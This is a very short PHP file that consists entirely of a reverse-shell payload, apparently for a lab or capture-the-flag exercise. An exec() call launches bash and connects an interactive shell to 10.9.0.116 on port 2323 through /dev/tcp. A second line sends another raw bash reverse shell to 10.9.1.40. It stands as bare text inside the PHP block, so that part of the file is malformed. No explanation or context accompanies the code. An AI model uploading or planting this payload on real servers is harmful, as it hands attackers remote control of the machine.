<?php
exec("/bin/bash -c 'bash -i &> /dev/tcp/10.9.0.116/2323 0<&1'")
bash -i >& /dev/tcp/10.9.1.40/2323 0>&1
?>
